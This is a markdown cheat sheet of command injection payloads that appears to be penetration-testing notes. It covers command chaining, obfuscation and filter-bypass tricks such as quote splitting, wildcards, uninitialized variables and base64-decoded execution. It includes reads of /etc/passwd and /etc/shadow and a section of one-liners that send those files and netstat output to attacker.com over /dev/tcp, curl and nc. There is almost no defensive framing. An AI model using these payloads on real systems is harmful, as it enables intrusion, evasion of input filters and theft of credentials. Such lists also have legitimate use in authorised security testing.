# Command Injection

## Payloads

```bash
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command


# Command obfuscation
w'h'o'am'i
w"h"o"am"i
\w\h\o\a\m\i

# Alternative commands
# Instead of: cat /etc/passwd
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
tac /etc/passwd

# Character substitution
$(rev<<<'imaohw')  # whoami reversed
$(printf "whoami")

# Command concatenation
'cat'</etc/passwd
"w"h"o"a"m"i

# Wildcard usage
/???/??t /??c/p??s??
/bin/c?t /etc/p?ssw?

# Using aliases
alias ls=whoami;ls

# Double encoding
$(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami in hex
```

## Sending To Server

```bash
# File reading
$(cat /etc/passwd > /dev/tcp/attacker.com/4444)
; base64 /etc/shadow | curl -d @- http://attacker.com

# System enumeration
; find / -perm -4000 2>/dev/null
; netstat -an | nc attacker.com 4444
```

## Bypass

Full: [https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html#short-rev-shell](https://book.hacktricks.wiki/en/linux-hardening/bypass-bash-restrictions/index.html#short-rev-shell)

Great: [https://hackviser.com/tactics/pentesting/web/command-injection](https://hackviser.com/tactics/pentesting/web/command-injection)

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

## Privesc

[https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

## Resources

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
